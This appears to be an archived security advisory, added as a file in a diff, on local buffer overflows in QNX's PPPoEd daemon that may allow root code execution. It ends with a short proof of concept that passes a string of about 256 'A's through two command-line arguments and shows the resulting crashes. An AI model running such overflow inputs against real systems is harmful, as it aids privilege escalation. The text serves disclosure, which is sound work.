@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/11104/info
+
+QNX PPPoEd is reported to be prone to multiple local buffer overflow vulnerabilities. The issues presents themselves when PPPoEd handles certain command line arguments that are greater than 256 bytes in length.
+
+Because variables that are crucial to controlling program execution flow for PPPoEd are stored adjacent to the affected buffers, an attacker may corrupt these values and influence PPPoEd program execution flow into attacker-controlled memory. Ultimately this may lead to the execution of arbitrary instructions in the context of the superuser.
+
+$ export overflow256='AAAAAAAAAAAAAAA(...)' (around 256 A's)
+$ /usr/bin/pppoed -F $overflow256
+Memory fault (core dumped)
+$ /usr/bin/pppoed service=$overflow256
+Memory fault (core dumped)
